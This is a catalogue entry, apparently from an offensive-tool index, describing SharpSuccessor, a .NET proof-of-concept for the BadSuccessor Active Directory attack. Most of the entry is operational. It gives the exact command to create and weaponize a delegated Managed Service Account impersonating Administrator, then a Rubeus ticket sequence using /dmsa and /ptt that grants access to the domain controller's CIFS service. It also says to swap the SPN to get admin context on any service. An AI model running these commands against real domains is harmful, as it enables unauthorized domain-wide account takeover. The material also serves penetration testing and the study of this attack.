---
name: "sharpsuccessor"
categories:
  - windows
homepage: "https://github.com/logangoins/SharpSuccessor"
origin: "hacktricks"
recipe: "upstream"
build-system: "windows"
meta-checked: "2026-11-13"
github-repo: "logangoins/SharpSuccessor"
github-stars: 436
github-match: "exact"
gh-checked: "2026-11-13"
worth: 5.2
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-13"
license: "custom:unknown"
---

# sharpsuccessor

> Weaponizes the BadSuccessor attack: create and arm a delegated MSO (dMSA) to impersonate any AD account you can write to.

## What it's for

SharpSuccessor is a .NET proof-of-concept that fully weaponizes the
"BadSuccessor" attack published by Akamai (Yuval Gordon): a
low-privileged user with `CreateChild` permissions on any
Organizational Unit and write access to a target object can perform a
full account takeover. The tool creates a new delegated Managed Service
Account in that OU, links it to the victim via
`msDS-ManagedAccountPrecededByLink`, and sets the delegation/UAC
attributes so the dMSA is trusted to act as the target (e.g.
Administrator) — without ever touching the victim's password. The
Kerberos side of the takeover (requesting tickets *as* the dMSA that
carry the victim's authorization) is done with Rubeus
([[rubeus]]) using its `/dmsa` options, documented below.

*No corpus evidence — derived from upstream documentation.*

## Typical use cases

### Create and weaponize the dMSA

One command performs the whole LDAP dance.

```
SharpSuccessor.exe add /impersonate:Administrator /path:"ou=test,dc=example,dc=com" /account:user /name:attacker_dMSA
```

Outcome: creates the `attacker_dMSA` object under the given OU, writes
its `dNSHostName`/`sAMAccountName`, resolves the impersonation target's
DN, writes `msDS-ManagedAccountPrecededByLink`, the dMSA state,
encryption types, UAC and access rights on the new object — ending with
a success message that the dMSA object was created and weaponized.

### Cash out the dMSA with Rubeus

Turn the armed dMSA into tickets for the target account.

```
Rubeus.exe tgtdeleg /nowrap
Rubeus.exe asktgs /targetuser:attacker_dmsa$ /service:krbtgt/corp.example.com /opsec /dmsa /nowrap /ptt /ticket:doIFTDCCB...
Rubeus.exe asktgs /user:attacker_dmsa$ /service:cifs/dc.corp.example.com /opsec /dmsa /nowrap /ptt /ticket:doIF2DCCB...
```

Outcome: `tgtdeleg` harvests a usable TGT for the current
(low-privileged) context; the first `asktgs ... /dmsa` mints a
delegated ticket for the dMSA that embeds the impersonated account's
PAC; the second requests a service ticket (here CIFS on the DC) under
`attacker_dmsa$` — submitted in-memory via `/ptt` — granting access as
the impersonated account. Swap the `/service:` SPN for any service you
want admin context on.
